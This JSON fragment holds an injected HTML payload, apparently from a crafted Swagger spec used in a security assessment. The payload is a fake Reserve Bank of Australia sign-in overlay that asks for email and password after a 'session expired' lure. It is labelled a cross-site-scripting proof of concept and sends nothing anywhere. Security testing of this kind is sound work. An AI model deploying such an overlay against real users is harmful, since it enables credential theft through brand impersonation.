    "description": "<div id=\"poc-overlay\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.65);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif\">\n<div style=\"background:#fff;border-radius:4px;width:420px;box-shadow:0 4px 24px rgba(0,0,0,0.25);overflow:hidden\">\n<div style=\"background:#002b5c;padding:20px 28px;display:flex;align-items:center;gap:14px\">\n<svg width=\"48\" height=\"48\" viewBox=\"0 0 48 48\"><circle cx=\"24\" cy=\"24\" r=\"22\" fill=\"#fff\"/><text x=\"24\" y=\"30\" text-anchor=\"middle\" font-size=\"18\" font-weight=\"bold\" fill=\"#002b5c\">RBA</text></svg>\n<div style=\"color:#fff\">\n<div style=\"font-size:18px;font-weight:600\">Reserve Bank of Australia</div>\n<div style=\"font-size:12px;opacity:0.8;margin-top:2px\">Events Administration Portal</div>\n</div>\n</div>\n<div style=\"padding:28px\">\n<div style=\"background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:12px 14px;margin-bottom:20px;font-size:13px;color:#664d03\">Your session has expired due to inactivity. Please sign in again to continue.</div>\n<form onsubmit=\"document.getElementById('poc-msg').style.display='block';this.style.display='none';return false\">\n<div style=\"margin-bottom:16px\">\n<label style=\"display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px\">Email Address</label>\n<input type=\"email\" placeholder=\"name@rba.gov.au\" style=\"width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;box-sizing:border-box;outline:none\" readonly onfocus=\"this.removeAttribute('readonly')\">\n</div>\n<div style=\"margin-bottom:20px\">\n<label style=\"display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px\">Password</label>\n<input type=\"password\" placeholder=\"Enter your password\" style=\"width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;box-sizing:border-box;outline:none\" readonly onfocus=\"this.removeAttribute('readonly')\">\n</div>\n<button type=\"submit\" style=\"width:100%;padding:11px;background:#002b5c;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer\">Sign In</button>\n</form>\n<div id=\"poc-msg\" style=\"display:none;text-align:center;padding:10px 0\">\n<div style=\"background:#f8d7da;border:1px solid #f5c6cb;border-radius:4px;padding:14px;margin-bottom:14px\">\n<div style=\"font-size:14px;font-weight:600;color:#721c24;margin-bottom:4px\">Proof of Concept - XSS Demonstrated</div>\n<div style=\"font-size:12px;color:#721c24\">This fake login form was injected via a crafted Swagger specification loaded through the <code>url</code> query parameter. No data was captured or transmitted. In a real attack, credentials entered here would be sent to an attacker-controlled server.</div>\n</div>\n<div style=\"font-size:11px;color:#999\">Aether Security Assessment - AETHER-QCK13-009</div>\n</div>\n<div style=\"text-align:center;margin-top:14px;font-size:11px;color:#999\">Protected by the Reserve Bank of Australia IT Security Policy</div>\n</div>\n</div>\n</div>",
